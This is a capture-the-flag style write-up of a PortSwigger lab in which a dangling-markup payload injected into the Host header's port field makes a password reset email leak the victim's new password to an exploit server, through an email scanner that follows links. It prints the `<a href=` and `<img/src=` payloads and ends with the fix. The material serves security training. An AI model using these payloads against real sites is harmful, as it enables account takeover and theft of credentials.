# Password reset poisoning via dangling markup

**Category:** HTTP Host Header Attacks
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

Every earlier lab in this series treated the Host header as a value that gets used whole — swapped
out, duplicated, or routed on, but always injected as a single clean token. This lab is different:
the server actually blocks a full Host header replacement outright. The path back in isn't "the
Host header is unvalidated," it's "the Host header is validated in a way that still leaves one
narrow crack open," and exploiting that crack means reaching for a technique — dangling markup —
that has nothing to do with HTTP parsing at all.

## The Target

The password reset flow here doesn't send a token-bearing link the way the first lab in this series
did. Instead it emails the new password directly, in a message shaped roughly like:

```
<a href='https://HOST/login'>click here</a> to login with your new password: RANDOM
```

Sending a request with the Host header replaced wholesale returns a 504 — the server is actively
rejecting tampered Host headers this time, not silently trusting them. That closes off the simple
version of the attack used in the first password-reset-poisoning lab.

## The Investigation

A flat rejection of Host tampering doesn't necessarily mean *every* part of the Host header is
validated with equal strictness. HTTP allows a port suffix on the Host header (`Host: domain:port`),
and port validation is exactly the kind of secondary detail that's easy to implement more loosely
than the domain check itself — a server might confirm the domain matches while accepting almost
anything as the port, on the assumption that a bad port is harmless.

We tested that directly with a canary value: `Host: lab.net:CANARY`. The request wasn't rejected,
and the resulting email reflected `:CANARY` directly into the `href` URL — confirming two things at
once. First, port values pass through where full domain replacement doesn't. Second, and more
important, the reflection happens inside a single-quoted HTML attribute (`href='...'`) with no
apparent escaping of the value before it's inserted.

An unescaped value landing inside a quoted attribute is the classic setup for dangling markup
injection: we don't need to break out of the page entirely or get script execution, we just need to
close the attribute early and open a new, deliberately unterminated one, so that everything the
server writes into the email *after* our injection point gets swallowed into an attacker-controlled
URL. Since the new password is one of the last things printed into the email body, and the email
doesn't otherwise contain a `"` character, an unterminated `"`-quoted attribute will keep consuming
content all the way to the end of the message — including the password.

## The Exploit

The dangling markup payload lives entirely inside the Host header's port field:

```
Host: lab.net:'<a href="//exploit-server-domain/?
```

Breaking that down: the leading `'` closes the original `href='...'` attribute early. `<a href="//exploit-server-domain/?` then opens a brand-new anchor tag whose `href` attribute is deliberately left with an unclosed `"`. Because nothing later in the email contains a `"` to close it, every character from that point forward — the rest of the greeting text, and the new password — becomes part of the dangling `href` URL's query string.

An email security scanner in this lab (identified in the exploit server logs as the "MacCarthy Email
Security service") automatically follows links present in incoming email as part of its scanning
behavior. That gave us exfiltration without needing `carlos` to click anything himself: the scanner
requested our dangling `<a>` URL on our behalf, carrying the captured password as part of the query
string, and that request landed in the exploit server's access log — something like
`GET /?...password:+PASSWORD...`. Sending the same request with `username=carlos` in the
`POST /forgot-password` body (instead of testing against our own account) put `carlos`'s actual
password into that log entry, which we extracted and used to log in as him.

Our notes also record a second working variant using `<img/src="//exploit/?` instead of `<a href=`
— an `<img>` tag auto-loads without needing anything to "click" it at all, and the `/` between `img`
and `src` works as an attribute separator in place of a space, which matters because a literal space
character inside the Host header value could complicate how cleanly it survives being parsed back
out of the port field.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the same core exploitation idea — port-field injection into an
unescaped, single-quoted `href` attribute, closed early to create a dangling anchor that captures
the password — but starts from a different observation point. Their walkthrough notes that the
email client used to view messages in this lab sanitizes displayed HTML with DOMPurify, and that the
injected markup only becomes visible if you view the email as **raw HTML** rather than as it's
rendered in the client's UI. Only after inspecting the raw source do they identify the single-quoted
attribute as the injection point and build the dangling-markup payload from there.

That step never came up for us, and the reason is a genuine tooling difference rather than a missed
step: our script never renders the email in a browser at all. It reads the exploit server's raw
access log directly via HTTP, so DOMPurify's client-side sanitization — which only affects how a
browser *displays* the email — has no bearing on a process that's parsing the underlying HTTP
traffic with a regex. Where PortSwigger's manual walkthrough has to work around a browser sanitizing
its view of the vulnerability, an automated script simply never looks at the sanitized view in the
first place. The underlying payload construction — port-field injection, single-quote closure,
dangling `<a>`/`<img>` capturing to end-of-message — is otherwise the same technique arrived at from
two different vantage points.

## What This Teaches Us

This lab is a reminder that "the Host header is validated" isn't a single fact — validation can be
strict for the part of the input an engineer thought about (the domain) and essentially absent for a
part they didn't (the port), and an attacker only needs the weaker of the two. It's also a good
illustration of dangling markup as a technique in its own right: it doesn't require script execution
or a content-type mismatch, just an unescaped value inside a quoted attribute and enough remaining
content after the injection point to be worth capturing. Combined with any mechanism that
automatically follows links — an AV scanner here, but this generalizes to link-preview bots, email
prefetching, or anything else that fetches URLs on a user's behalf — dangling markup can exfiltrate
data without any interaction from the actual victim at all. The fix, as in every other lab in this
series, is to stop treating the Host header as safe input: escape or reject anything unexpected in
every field of it, port included, before it's concatenated into HTML.
